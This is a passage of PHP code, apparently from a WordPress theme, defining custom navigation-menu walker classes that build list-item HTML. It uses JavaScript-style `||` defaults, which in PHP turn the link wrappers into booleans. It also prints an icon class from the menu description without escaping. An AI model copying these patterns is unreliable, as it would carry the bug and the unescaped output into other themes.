			$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		}

	}

    public function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= "</li>\n";
    }

}

class king_Walker_Onepage_Nav_Menu extends Walker_Nav_Menu {

		public function start_lvl( &$output , $depth = 0, $args = array()) {}

		public function end_lvl( &$output, $depth = 0, $args = array() ) {}

		public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';

		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}

		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );
		if( strpos( $class_names, 'current-menu-item' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active';
			}
		}
		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}
		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
		$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

		$item_output = '<li class="'.esc_attr($item->classes[0]).'"><a'. $attributes .'>';
		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';
		}

		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a></li>';

		$output .= $item_output;

	}

    public function end_el( &$output, $item, $depth = 0, $args = array() ) {}

}



class king_Walker_Top_Nav_Menu extends Walker_Nav_Menu {

	public function start_lvl( &$output , $depth = 0, $args = array()) {
		$indent = '';
		$output .= '';
	}

	public function end_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = '';
		$output .= '';
   }
   public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';

		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}

		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );
		if( strpos( $class_names, 'current-menu-item' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active';
			}
		}
		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}

		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
		$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

		$item_output = $indent . '<li' . $id . $class_names .'>';
		$item_output .= '<a'. $attributes .'>';

		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';
		}

		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a></li>';

		$output .= $item_output;

	}

    public function end_el( &$output, $item, $depth = 0, $args = array() ) {
        $output .= '';
    }

}
